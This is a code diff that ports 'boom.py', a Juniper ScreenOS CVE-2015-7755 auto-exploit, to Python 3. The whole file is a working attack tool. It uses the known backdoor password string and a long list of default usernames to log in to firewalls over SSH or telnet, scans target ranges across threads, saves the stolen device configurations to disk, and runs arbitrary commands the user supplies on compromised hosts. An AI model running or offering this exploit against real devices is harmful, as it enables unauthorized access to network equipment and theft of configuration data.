@@ -1,8 +1,7 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import os
 import sys
-import socket
 import argparse
 import threading
 
@@ -48,24 +47,24 @@ class SSHClient(Client):
         try:
             while self.tunnel.recv_ready():
                 bf.append(self.tunnel.recv(500))
-        except:
+        except OSError:
             None
-        return ''.join(bf)
+        return "".join(bf)
 
     def exec_cmd(self, command):
         if not self.tunnel:
             self.tunnel = self.client.invoke_shell()
             self.tunnel.settimeout(1)
-        self.tunnel.send('%s\n' % command)
+        self.tunnel.send("%s\n" % command)
         bf = []
         if not self.tunnel.recv_ready():
             bf.append(self.tunnel.recv(500))
         try:
             while 1:
                 bf.append(self.tunnel.recv(500))
-        except:
+        except OSError:
             None
-        return ''.join(bf)
+        return "".join(bf)
 
 
 class TelnetClient(Client):
@@ -77,11 +76,11 @@ class TelnetClient(Client):
 
     def send(self, data):
         self.client.write(data)
-        return self.client.read_until('--- more ---', 1)
+        return self.client.read_until("--- more ---", 1)
 
     def exec_cmd(self, command):
         self.client.write("%s\n" % command)
-        return self.client.read_until('--- more ---', 1)
+        return self.client.read_until("--- more ---", 1)
 
 
 class Exploit:
@@ -94,7 +93,8 @@ class Exploit:
 
     @staticmethod
     def start():
-        print("""
+        print(
+            """
               ,--.!,
            __/   -*-
          ,d08b.  '|`
@@ -103,30 +103,100 @@ class Exploit:
             boom.py
             Juniper Telnet/SSH CVE-2015-7755 ScreenOS AutoExploit
             Eric Grzybowski
-            """)  # with help by Scott Brion
+            """
+        )  # with help by Scott Brion
 
     def main(self):
         Exploit.start()
-        cmd = argparse.ArgumentParser(description='Juniper ScreenOS CVE 2015-7755 Exploit')
-        cmd.add_argument('-p', action='store', dest='port', type=int,
-                         help='Port to test, only valid if "-t" is specified!', default=None, required=False)
-        cmd.add_argument('-o', action='store', dest='output', type=str, help='Log file output path', default=None,
-                         required=False)
-        cmd.add_argument('-t', action='store', dest='type', type=str,
-                         help='Protocol to test; ssh (s) or telnet (t)', choices=('ssh', 'telnet', 's', 't'),
-                         default=None, required=False)
-        cmd.add_argument('-w', action='store', dest='timeout', type=int,
-                         help='Connection timeout in seconds', default=1, required=False)
-        cmd.add_argument('-d', action='store', dest='save_dir', type=str, help='Where to save downloaded configs',
-                         default=None, required=False)
-        cmd.add_argument('-m', action='store', dest='threads', type=int, help='Concurrent threads to run',
-                         default=None, required=False)
-        cmd.add_argument('-c', action='store', dest='command', type=str, help='Command to run on successful connect',
-                         default=None, required=False)
-        cmd.add_argument('-v', '--verbose', action="store_true", default=False, help='Enable verbose logging')
-        cmd.add_argument('targets', action='store', nargs='+', type=str, help='List of targets (comma/spaced/ranges)')
-        cmd.add_argument('--users', action='store', nargs='*', type=str, dest='user',
-                         help='List of additional usernames (comma/spaced)')
+        cmd = argparse.ArgumentParser(
+            description="Juniper ScreenOS CVE 2015-7755 Exploit"
+        )
+        cmd.add_argument(
+            "-p",
+            action="store",
+            dest="port",
+            type=int,
+            help='Port to test, only valid if "-t" is specified!',
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-o",
+            action="store",
+            dest="output",
+            type=str,
+            help="Log file output path",
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-t",
+            action="store",
+            dest="type",
+            type=str,
+            help="Protocol to test; ssh (s) or telnet (t)",
+            choices=("ssh", "telnet", "s", "t"),
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-w",
+            action="store",
+            dest="timeout",
+            type=int,
+            help="Connection timeout in seconds",
+            default=1,
+            required=False,
+        )
+        cmd.add_argument(
+            "-d",
+            action="store",
+            dest="save_dir",
+            type=str,
+            help="Where to save downloaded configs",
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-m",
+            action="store",
+            dest="threads",
+            type=int,
+            help="Concurrent threads to run",
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-c",
+            action="store",
+            dest="command",
+            type=str,
+            help="Command to run on successful connect",
+            default=None,
+            required=False,
+        )
+        cmd.add_argument(
+            "-v",
+            "--verbose",
+            action="store_true",
+            default=False,
+            help="Enable verbose logging",
+        )
+        cmd.add_argument(
+            "targets",
+            action="store",
+            nargs="+",
+            type=str,
+            help="List of targets (comma/spaced/ranges)",
+        )
+        cmd.add_argument(
+            "--users",
+            action="store",
+            nargs="*",
+            type=str,
+            dest="user",
+            help="List of additional usernames (comma/spaced)",
+        )
         ta = cmd.parse_args()
         if not ta:
             print('[!] Incorrect arguments! Please use "%s -h"!' % __file__)
@@ -137,12 +207,12 @@ class Exploit:
         targets = []
         targets_list = []
         for tar in ta.targets:
-            if ',' in tar:
-                targets_list.extend([f.strip() for f in tar.split(',')])
+            if "," in tar:
+                targets_list.extend([f.strip() for f in tar.split(",")])
             else:
                 targets_list.append(tar.strip())
         for tar in targets_list:
-            if '-' in tar:
+            if "-" in tar:
                 tar_list = Exploit.split_range(tar)
                 for tarl in tar_list:
                     if not (tarl in targets):
@@ -153,8 +223,8 @@ class Exploit:
         if ta.user:
             user_list = []
             for user in ta.user:
-                if ',' in user:
-                    for us in user.split(','):
+                if "," in user:
+                    for us in user.split(","):
                         usern = us.strip()
                         if not (usern in ExploitPayload.USER_LIST):
                             user_list.append(usern)
@@ -163,29 +233,29 @@ class Exploit:
                     if not (usern in ExploitPayload.USER_LIST):
                         user_list.append(usern)
             if len(user_list) > 0:
-                ExploitPayload.USER_LIST = (user_list + ExploitPayload.USER_LIST)
+                ExploitPayload.USER_LIST = user_list + ExploitPayload.USER_LIST
         if ta.verbose:
             self.__verbose = True
         con_type = None
         if isinstance(ta.type, str):
-            if ta.type.lower() == 'ssh' or ta.type.lower() == 's':
+            if ta.type.lower() == "ssh" or ta.type.lower() == "s":
                 con_type = 1
-            elif ta.type.lower() == 'telnet' or ta.type.lower() == 't':
+            elif ta.type.lower() == "telnet" or ta.type.lower() == "t":
                 con_type = 2
         if ta.output:
             print('[*] Output to log file "%s"' % ta.output)
-            self.__output = open(ta.output, 'a')
+            self.__output = open(ta.output, "a")
         port = None
         timeout = 1
         if ta.timeout:
             try:
                 timeout = int(ta.timeout)
-            except:
+            except ValueError:
                 None
         if con_type and ta.port:
             try:
                 port = int(ta.port)
-            except:
+            except ValueError:
                 print('[!] Incorrect arguments! "%s" is not a number!' % ta.port)
                 sys.exit(-1)
         if ta.save_dir:
@@ -194,66 +264,84 @@ class Exploit:
                 self.__output_dir = ta.save_dir
         if ta.command:
             self.__command = ta.command
-        self.info('boom.py Init. %d Targets selected.' % len(targets))
+        self.info("boom.py Init. %d Targets selected." % len(targets))
         if ta.threads and len(targets) > 1:
             try:
                 tc = int(ta.threads)
-            except:
+            except ValueError:
                 print('[!] Incorrect arguments! "%s" is not a number!' % ta.threads)
                 sys.exit(-1)
             if tc:
                 tlen = len(targets)
-                self.verbose('Threading mode selected! %d threads needed! %d targets' % (tc, tlen))
-                tct = (tlen / tc)
-                self.verbose('Allocated %d average targets per thread.' % tct)
+                self.verbose(
+                    "Threading mode selected! %d threads needed! %d targets"
+                    % (tc, tlen)
+                )
+                tct = tlen / tc
+                self.verbose("Allocated %d average targets per thread." % tct)
                 tctr = tlen - (tct * tc)
                 if tct > 0:
                     tst = 0
                     thct = 0
                     while thct < tc:
-                        thr = ExploitThread(self, targets[tst:tst+tct], port, con_type, timeout, thct)
-                        self.verbose('Allocated thread %d with range %d-%d!' % (thct, tst, (tst+tct)))
+                        thr = ExploitThread(
+                            self,
+                            targets[tst:tst + tct],
+                            port,
+                            con_type,
+                            timeout,
+                            thct,
+                        )
+                        self.verbose(
+                            "Allocated thread %d with range %d-%d!"
+                            % (thct, tst, (tst + tct))
+                        )
                         tst += tct
                         thct += 1
                         self.__threads.append(thr)
                     if tctr > 0:
                         print(targets[(tc * tct) + tctr - 1:])
-                        self.__threads[0].targets.extend(targets[(tc * tct) + tctr - 1:])
+                        self.__threads[0].targets.extend(
+                            targets[(tc * tct) + tctr - 1:]
+                        )
                     for thread in self.__threads:
                         thread.start()
                 else:
-                    print('[!] Too many threads! "%s" targets, "%s" threads!' % (len(targets), tct))
+                    print(
+                        '[!] Too many threads! "%s" targets, "%s" threads!'
+                        % (len(targets), tct)
+                    )
                     sys.exit(-1)
         else:
             if ta.threads:
-                self.error('Ignoring thread count as there is one host to scan!')
+                self.error("Ignoring thread count as there is one host to scan!")
             self.exploit_run(targets, port, con_type, ExploitPayload.USER_LIST, timeout)
 
     @staticmethod
     def get_config(client):
         bf = []
-        a = client.exec_cmd('get config')
+        a = client.exec_cmd("get config")
         bf.append(a)
-        if '--- more ---' in a:
+        if "--- more ---" in a:
             while 1:
-                a = client.send(' ')
+                a = client.send(" ")
                 bf.append(a)
-                if '->' in a:
+                if "->" in a:
                     break
-        return ''.join(bf)
+        return "".join(bf)
 
     @staticmethod
     def split_range(range_data):
         range_targets = []
-        if ':' in range_data:
-            rv = ':'
+        if ":" in range_data:
+            rv = ":"
         else:
-            rv = '.'
+            rv = "."
         trang = range_data.split(rv)
         trgv = None
         tgrvp = 0
         for trng in trang:
-            if '-' in trng:
+            if "-" in trng:
                 trgv = (trng, tgrvp)
                 break
             tgrvp += 1
@@ -264,69 +352,81 @@ class Exploit:
             tse = rv.join(trang[trgv[1] + 1:])
         else:
             tse = None
-        iss = trgv[0].find('-')
-        if rv == '.':
+        iss = trgv[0].find("-")
+        if rv == ".":
             try:
                 pss = int(trgv[0][:iss])
                 pse = int(trgv[0][iss + 1:])
-            except:
+            except ValueError:
                 return None
         else:
             try:
                 pss = int(trgv[0][:iss], 16)
                 pse = int(trgv[0][iss + 1:], 16)
-            except:
+            except ValueError:
                 return None
-        for x in range(pss, pse+1):
+        for x in range(pss, pse + 1):
             if not tse:
-                range_targets.append('%s%s%s' % (tss, rv, (x if rv == '.' else hex(x).replace('0x',''))))
+                range_targets.append(
+                    "%s%s%s" % (tss, rv, (x if rv == "." else hex(x).replace("0x", "")))
+                )
             else:
-                range_targets.append('%s%s%s%s%s' % (tss, rv, (x if rv == '.' else hex(x).replace('0x','')), rv, tse))
+                range_targets.append(
+                    "%s%s%s%s%s"
+                    % (tss, rv, (x if rv == "." else hex(x).replace("0x", "")), rv, tse)
+                )
         return range_targets
 
     def info(self, data, threadd=None):
         if self.__output:
             if threadd:
-                self.__output.write('[*] (Thread: %s) %s\n' % (threadd, data))
+                self.__output.write("[*] (Thread: %s) %s\n" % (threadd, data))
             else:
-                self.__output.write('[*] %s\n' % data)
+                self.__output.write("[*] %s\n" % data)
         else:
             if threadd:
-                print('[*] (Thread: %s) %s' % (threadd, data))
+                print("[*] (Thread: %s) %s" % (threadd, data))
             else:
-                print('[*] %s' % data)
+                print("[*] %s" % data)
 
     def error(self, data, threadd=None):
         if self.__output:
             if threadd:
-                self.__output.write('[!] (Thread: %s) %s\n' % (threadd, data))
+                self.__output.write("[!] (Thread: %s) %s\n" % (threadd, data))
             else:
-                self.__output.write('[!] %s\n' % data)
+                self.__output.write("[!] %s\n" % data)
         else:
             if threadd:
-                print('[!] (Thread: %s) %s' % (threadd, data))
+                print("[!] (Thread: %s) %s" % (threadd, data))
             else:
-                print('[!] %s' % data)
+                print("[!] %s" % data)
 
     def verbose(self, data, threadd=None):
         if self.__verbose:
             if self.__output:
                 if threadd:
-                    self.__output.write('[V] (Thread: %s) %s\n' % (threadd, data))
+                    self.__output.write("[V] (Thread: %s) %s\n" % (threadd, data))
                 else:
-                    self.__output.write('[V] %s\n' % data)
+                    self.__output.write("[V] %s\n" % data)
             else:
                 if threadd:
-                    print('[V] (Thread: %s) %s' % (threadd, data))
+                    print("[V] (Thread: %s) %s" % (threadd, data))
                 else:
-                    print('[V] %s' % data)
+                    print("[V] %s" % data)
 
     @staticmethod
     def ssh_connect(host, port, user, password, timeout):
         ssh_cli = paramiko.SSHClient()
         ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh_cli.connect(host, username=user, password=password, port=port, look_for_keys=False, allow_agent=False,
-                        timeout=timeout)
+        ssh_cli.connect(
+            host,
+            username=user,
+            password=password,
+            port=port,
+            look_for_keys=False,
+            allow_agent=False,
+            timeout=timeout,
+        )
         return SSHClient(ssh_cli)
 
     @staticmethod
@@ -341,71 +441,111 @@ class Exploit:
     def exploit_ssh(self, target, port, user, timeout, thread):
         try:
             if port:
-                con = Exploit.ssh_connect(target, port, user, ExploitPayload.PASSWORD, timeout)
+                con = Exploit.ssh_connect(
+                    target, port, user, ExploitPayload.PASSWORD, timeout
+                )
             else:
-                con = Exploit.ssh_connect(target, 22, user, ExploitPayload.PASSWORD, timeout)
+                con = Exploit.ssh_connect(
+                    target, 22, user, ExploitPayload.PASSWORD, timeout
+                )
             conf_data = Exploit.get_config(con)
             if conf_data:
-                conf_data = conf_data.\
-                    replace('--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H', '')
-                self.verbose('Was able to capture config of "%s" over ssh!' % target, thread)
+                conf_data = conf_data.replace(
+                    "--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H",
+                    "",
+                )
+                self.verbose(
+                    'Was able to capture config of "%s" over ssh!' % target, thread
+                )
                 self.info('EXPLOIT:SSH> "%s" is Vulnerable!' % target, thread)
                 if self.__output_dir:
                     try:
-                        conf_path = os.path.join(self.__output_dir, '%s-ssh.cfg' % target)
-                        conf_file = open(conf_path, 'w+')
+                        conf_path = os.path.join(
+                            self.__output_dir, "%s-ssh.cfg" % target
+                        )
+                        conf_file = open(conf_path, "w+")
                         conf_file.write(conf_data)
                         conf_file.close()
-                        self.info('Config for "%s" saved as "%s"' % (target, conf_path), thread)
+                        self.info(
+                            'Config for "%s" saved as "%s"' % (target, conf_path),
+                            thread,
+                        )
                     except Exception as message:
-                        self.error('Could not save config for "%s"! Error: %s' % (target, str(message)), thread)
+                        self.error(
+                            'Could not save config for "%s"! Error: %s'
+                            % (target, str(message)),
+                            thread,
+                        )
             if self.__command:
                 self.info('Running specified command on "%s"' % target)
                 cmd_result = con.exec_cmd(self.__command)
                 self.verbose('Ran specified command on "%s"' % target)
                 if cmd_result:
-                    self.info('Command result from "%s" returned\n"%s"' % (target, cmd_result))
+                    self.info(
+                        'Command result from "%s" returned\n"%s"' % (target, cmd_result)
+                    )
             con.close()
             return True
         except paramiko.ssh_exception.AuthenticationException:
-            self.verbose('Authentication error! "%s" might be patched?' % target, thread)
+            self.verbose(
+                'Authentication error! "%s" might be patched?' % target, thread
+            )
             return False
-        except:
+        except Exception:
             return True
 
     def exploit_telnet(self, target, port, user, timeout, thread):
         try:
             if port:
-                con = Exploit.telnet_connect(target, port, user, ExploitPayload.PASSWORD, timeout)
+                con = Exploit.telnet_connect(
+                    target, port, user, ExploitPayload.PASSWORD, timeout
+                )
             else:
-                con = Exploit.telnet_connect(target, 23, user, ExploitPayload.PASSWORD, timeout)
+                con = Exploit.telnet_connect(
+                    target, 23, user, ExploitPayload.PASSWORD, timeout
+                )
             conf_data = Exploit.get_config(con)
             if conf_data:
-                conf_data = conf_data.\
-                    replace('--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H', '')
-                self.verbose('Was able to capture config of "%s" over telnet!' % target, thread)
+                conf_data = conf_data.replace(
+                    "--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H",
+                    "",
+                )
+                self.verbose(
+                    'Was able to capture config of "%s" over telnet!' % target, thread
+                )
                 self.info('EXPLOIT:TELNET> "%s" is Vulnerable!' % target, thread)
                 if self.__output_dir:
                     try:
-                        conf_path = os.path.join(self.__output_dir, '%s-telnet.cfg' % target)
-                        conf_file = open(conf_path, 'w+')
+                        conf_path = os.path.join(
+                            self.__output_dir, "%s-telnet.cfg" % target
+                        )
+                        conf_file = open(conf_path, "w+")
                         conf_file.write(conf_data)
                         conf_file.close()
-                        self.info('Config for "%s" saved as "%s"' % (target, conf_path), thread)
+                        self.info(
+                            'Config for "%s" saved as "%s"' % (target, conf_path),
+                            thread,
+                        )
                     except Exception as message:
-                        self.error('Could not save config for "%s"! Error: %s' % (target, str(message)), thread)
+                        self.error(
+                            'Could not save config for "%s"! Error: %s'
+                            % (target, str(message)),
+                            thread,
+                        )
             if self.__command:
                 self.info('Running specified command on "%s"' % target)
                 cmd_result = con.exec_cmd(self.__command)
                 self.verbose('Ran specified command on "%s"' % target)
                 if cmd_result:
-                    self.info('Command result from "%s" returned\n"%s"' % (target, cmd_result))
+                    self.info(
+                        'Command result from "%s" returned\n"%s"' % (target, cmd_result)
+                    )
             con.close()
             return True
         except paramiko.ssh_exception.AuthenticationException:
             self.error('Authentication error! "%s" might be patched?' % target, thread)
             return False
-        except:
+        except Exception:
             return True
 
     def exploit_run(self, targets, port, con_type, users, timeout, thread=None):
@@ -421,7 +561,10 @@ class Exploit:
                         both = False
                         if self.exploit_ssh(target, port, user, timeout, thread):
                             both = True
-                        if self.exploit_telnet(target, port, user, timeout, thread) and both:
+                        if (
+                            self.exploit_telnet(target, port, user, timeout, thread)
+                            and both
+                        ):
                             break
                     elif con_type == 1:
                         if self.exploit_ssh(target, port, user, timeout, thread):
@@ -429,45 +572,233 @@ class Exploit:
                     elif con_type == 2:
                         if self.exploit_telnet(target, port, user, timeout, thread):
                             break
-                except:
+                except Exception:
                     break
 
 
 class ExploitPayload:
     PASSWORD = "<<< %s(un='%s') = %u"
     USER_LIST = [
-                    'admin', 'netscreen', 'debug', 'tech', 'adm', 'adminttd', 'operator',
-                    'security', '3comcso', 'root', 'monitor', 'manager', 'Administrator',
-                    'recovery', 'volition', 'sysadm', 'none', 'kermit', 'dhs3mt', 'at4400',
-                    'mtch', 'mtcl', 'dhs3pms', 'adfexc', 'client', 'install', 'halt', 'diag',
-                    'acc', 'apc', 'device', 'IntraSwitch', 'IntraStack', 'superuser', 'readonly',
-                    'customer', 'DTA', 'craft', 'manuf', 'User', 'patrol', 'netman', 'mediator',
-                    'cellit', 'cmaker', 'netrangr', 'bbsd-client', 'sa', 'Cisco', 'guest',
-                    'anonymous', 'PFCUser', 'cgadmin', 'super', 'davox', 'MDaemon', 'PBX',
-                    'NETWORK', 'NETOP', 'D-Link', 'login', 'public', 'supervisor', 'MGR',
-                    'PCUSER', 'RSBCMON', 'SPOOLMAN', 'WP', 'ADVMAIL', 'FIELD', 'HELLO',
-                    'MAIL', 'storwatch', 'vt100', 'superadmin', 'hscroot', 'NICONEX', 'setup',
-                    'intel', 'SYSDBA', 'intermec', 'system', 'JDE', 'PRODDTA', 'hydrasna',
-                    'sysadmin', '!root', 'readwrite', 'LUCENT01', 'LUCENT02', 'bciim', 'bcim',
-                    'bcms', 'bcnas', 'blue', 'browse', 'cust', 'enquiry', 'inads', 'init',
-                    'locate', 'maint', 'nms', 'rcust', 'support', 'ami', 'MICRO', 'service',
-                    'mac', 'cablecom', 'GlobalAdmin', 'superman', 'naadmin', 'netopia',
-                    'e500', 'e250', 'vcr', 'm1122', 'telecom', 'disttech', 'mlusr', 'l2', 'l3',
-                    'ro', 'rw', 'rwa', 'spcl', 'ccrusr', 'adminstat', 'adminview', 'adminuser',
-                    'helpdesk', 'sys', 'cac_admin', 'write', 'd.e.b.u.g', 'echo', 'pmd',
-                    'PSEAdmin', 'Polycom', 'lp', 'radware', 'wradmin', 'piranha', 'teacher',
-                    'temp1', 'admin2', 'adminstrator', 'deskalt', 'deskman', 'desknorm',
-                    'deskres', 'replicator', 'RMUser1', 'topicalt', 'topicnorm', 'topicres',
-                    'GEN1', 'GEN2', 'ADMN', 'eng', 'op', 'su', 'poll', 'smc', 'aaa', 'enable',
-                    'xbox', 'tellabs', 'tiara', 'NAU', 'HTTP', 'Any', 'VNC', 'rapport', 'xd',
-                    'jagadmin', 'system/manager', 'dadmin', 'target', 'scmadmin', 'webadmin',
-                    'corecess', 'installer', 'hsa', 'wlse', 'tiger', 'super.super', 'CSG',
-                    'cusadmin', 'USERID', 'websecadm', 'telco', 'ftp_inst', 'ftp_admi',
-                    'ftp_oper', 'ftp_nmc', 'comcast', 'SSA', 'wlseuser', 'MD110', 'draytek',
-                    'technician', 'ADSL', 'stratacom', 'CISCO15', 'scout', 'Gearguy',
-                    'Alphanetworks', 'Factory', 'isp', 'citel', 'netadmin', 'maintainer',
-                    'manage', 'iclock', 'mso', 'images', 'engmode'
-                ]
+        "admin",
+        "netscreen",
+        "debug",
+        "tech",
+        "adm",
+        "adminttd",
+        "operator",
+        "security",
+        "3comcso",
+        "root",
+        "monitor",
+        "manager",
+        "Administrator",
+        "recovery",
+        "volition",
+        "sysadm",
+        "none",
+        "kermit",
+        "dhs3mt",
+        "at4400",
+        "mtch",
+        "mtcl",
+        "dhs3pms",
+        "adfexc",
+        "client",
+        "install",
+        "halt",
+        "diag",
+        "acc",
+        "apc",
+        "device",
+        "IntraSwitch",
+        "IntraStack",
+        "superuser",
+        "readonly",
+        "customer",
+        "DTA",
+        "craft",
+        "manuf",
+        "User",
+        "patrol",
+        "netman",
+        "mediator",
+        "cellit",
+        "cmaker",
+        "netrangr",
+        "bbsd-client",
+        "sa",
+        "Cisco",
+        "guest",
+        "anonymous",
+        "PFCUser",
+        "cgadmin",
+        "super",
+        "davox",
+        "MDaemon",
+        "PBX",
+        "NETWORK",
+        "NETOP",
+        "D-Link",
+        "login",
+        "public",
+        "supervisor",
+        "MGR",
+        "PCUSER",
+        "RSBCMON",
+        "SPOOLMAN",
+        "WP",
+        "ADVMAIL",
+        "FIELD",
+        "HELLO",
+        "MAIL",
+        "storwatch",
+        "vt100",
+        "superadmin",
+        "hscroot",
+        "NICONEX",
+        "setup",
+        "intel",
+        "SYSDBA",
+        "intermec",
+        "system",
+        "JDE",
+        "PRODDTA",
+        "hydrasna",
+        "sysadmin",
+        "!root",
+        "readwrite",
+        "LUCENT01",
+        "LUCENT02",
+        "bciim",
+        "bcim",
+        "bcms",
+        "bcnas",
+        "blue",
+        "browse",
+        "cust",
+        "enquiry",
+        "inads",
+        "init",
+        "locate",
+        "maint",
+        "nms",
+        "rcust",
+        "support",
+        "ami",
+        "MICRO",
+        "service",
+        "mac",
+        "cablecom",
+        "GlobalAdmin",
+        "superman",
+        "naadmin",
+        "netopia",
+        "e500",
+        "e250",
+        "vcr",
+        "m1122",
+        "telecom",
+        "disttech",
+        "mlusr",
+        "l2",
+        "l3",
+        "ro",
+        "rw",
+        "rwa",
+        "spcl",
+        "ccrusr",
+        "adminstat",
+        "adminview",
+        "adminuser",
+        "helpdesk",
+        "sys",
+        "cac_admin",
+        "write",
+        "d.e.b.u.g",
+        "echo",
+        "pmd",
+        "PSEAdmin",
+        "Polycom",
+        "lp",
+        "radware",
+        "wradmin",
+        "piranha",
+        "teacher",
+        "temp1",
+        "admin2",
+        "adminstrator",
+        "deskalt",
+        "deskman",
+        "desknorm",
+        "deskres",
+        "replicator",
+        "RMUser1",
+        "topicalt",
+        "topicnorm",
+        "topicres",
+        "GEN1",
+        "GEN2",
+        "ADMN",
+        "eng",
+        "op",
+        "su",
+        "poll",
+        "smc",
+        "aaa",
+        "enable",
+        "xbox",
+        "tellabs",
+        "tiara",
+        "NAU",
+        "HTTP",
+        "Any",
+        "VNC",
+        "rapport",
+        "xd",
+        "jagadmin",
+        "system/manager",
+        "dadmin",
+        "target",
+        "scmadmin",
+        "webadmin",
+        "corecess",
+        "installer",
+        "hsa",
+        "wlse",
+        "tiger",
+        "super.super",
+        "CSG",
+        "cusadmin",
+        "USERID",
+        "websecadm",
+        "telco",
+        "ftp_inst",
+        "ftp_admi",
+        "ftp_oper",
+        "ftp_nmc",
+        "comcast",
+        "SSA",
+        "wlseuser",
+        "MD110",
+        "draytek",
+        "technician",
+        "ADSL",
+        "stratacom",
+        "CISCO15",
+        "scout",
+        "Gearguy",
+        "Alphanetworks",
+        "Factory",
+        "isp",
+        "citel",
+        "netadmin",
+        "maintainer",
+        "manage",
+        "iclock",
+        "mso",
+        "images",
+        "engmode",
+    ]
 
 
 class ExploitThread(threading.Thread):
@@ -483,12 +814,18 @@ class ExploitThread(threading.Thread):
             self.targets = [self.targets]
 
     def run(self):
-        self.__exploit_host.verbose('Thread %s starting' % self.__id)
-        self.__exploit_host.exploit_run(self.targets, self.__port, self.__con_type, ExploitPayload.USER_LIST,
-                                        self.__timeout, '%s' % self.__id)
-        self.__exploit_host.verbose('Thread %s finished!' % self.__id)
+        self.__exploit_host.verbose("Thread %s starting" % self.__id)
+        self.__exploit_host.exploit_run(
+            self.targets,
+            self.__port,
+            self.__con_type,
+            ExploitPayload.USER_LIST,
+            self.__timeout,
+            "%s" % self.__id,
+        )
+        self.__exploit_host.verbose("Thread %s finished!" % self.__id)
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     a = Exploit()
     a.main()
